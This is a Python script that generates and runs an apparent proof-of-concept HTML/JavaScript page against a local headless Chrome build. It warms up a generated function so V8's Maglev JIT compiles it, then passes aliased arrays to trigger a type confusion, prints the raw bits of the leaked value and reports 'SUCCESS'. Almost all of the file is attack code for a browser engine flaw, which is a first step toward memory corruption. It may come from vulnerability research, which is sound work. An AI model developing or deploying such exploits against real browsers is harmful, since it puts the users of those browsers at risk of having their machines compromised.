import subprocess, tempfile

def test_iterations(warmup_count):
    html = f"""<!doctype html>
<meta charset="utf-8">
<script>
let dummy = {{ a: 1 }};
let double_pool1 = [];
let double_pool2 = [];

function create_and_warmup() {{
  let lines = [];
  lines.push("function sink_alias(x, v2, v3, obj, limit) {{");
  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${{i}}) return ${{i}};`);
  lines.push("  v2[0] = obj;");
  lines.push("  let i = 0;");
  lines.push("  let res = 0.0;");
  lines.push("  let dummy_var = 0;");
  lines.push("  while (i < limit) {{");
  lines.push("    res = v3[1];");
  lines.push("    for (let j = 0; j < 80; j++) dummy_var = (dummy_var + j) | 0;");
  lines.push("    i++;");
  lines.push("  }}");
  lines.push("  return res;");
  lines.push("}}");
  lines.push("return sink_alias;");
  let fn = new Function(lines.join("\\n"))();

  // Pre-allocate pools: 2000 pairs of independent double arrays
  for (let i = 0; i < 2000; i++) {{
    double_pool1.push([1.1, 2.2, 3.3]);
    double_pool2.push([4.4, 5.5, 6.6]);
  }}

  console.log("Warmup starting: {warmup_count} iterations...");
  for (let i = 0; i < {warmup_count}; i++) {{
    fn(1000, double_pool1[i % 2000], double_pool2[i % 2000], dummy, 1);
  }}
  console.log("Warmup done!");
  return fn;
}}

async function main() {{
  let fn = create_and_warmup();
  console.log("Waiting for Maglev compilation...");
  await new Promise(r => setTimeout(r, 2000));

  console.log("Calling sink_alias with aliased victim...");
  let victim = [1.1, 2.2, 3.3];
  let res = fn(1000, victim, victim, dummy, 2);
  console.log("RESULT: type=" + typeof res + " val=" + res);
  
  let buf = new ArrayBuffer(8);
  let f64 = new Float64Array(buf);
  let u32 = new Uint32Array(buf);
  f64[0] = res;
  let hex = "0x" + u32[1].toString(16) + "_" + u32[0].toString(16);
  console.log("HEX BITS: " + hex);
  
  if (res !== 2.2) {{
    console.log("🔥🔥🔥 SUCCESS! TYPE CONFUSION TRIGGERED! Res !== 2.2! " + hex + " 🔥🔥🔥");
  }} else {{
    console.log("Still 2.2, victim[0]:", victim[0]);
  }}
  window.close();
}}
main();
</script>"""

    with open("script/test_sink_clean.html", "w") as f:
        f.write(html)

    profile = tempfile.mkdtemp(prefix="prof-")
    cmd = [
        "./script/candidate/chrome/chrome",
        "--headless=new",
        "--no-sandbox",
        "--disable-gpu",
        "--disable-dev-shm-usage",
        f"--user-data-dir={profile}",
        "--enable-logging=stderr",
        "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt --trace-deopt",
        "http://127.0.0.1:8000/test_sink_clean.html"
    ]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    try:
        out, _ = p.communicate(timeout=6)
    except subprocess.TimeoutExpired:
        p.kill()
        out, _ = p.communicate()
    import shutil
    shutil.rmtree(profile, ignore_errors=True)

    print(f"=== Results for {warmup_count} iterations ===")
    for line in out.splitlines():
        if any(k in line for k in ["RESULT", "HEX", "SUCCESS", "Still", "sink_alias", "compil", "CONSOLE", "deopt", "marking"]):
            print(line)

test_iterations(3000)
test_iterations(5000)
test_iterations(8000)
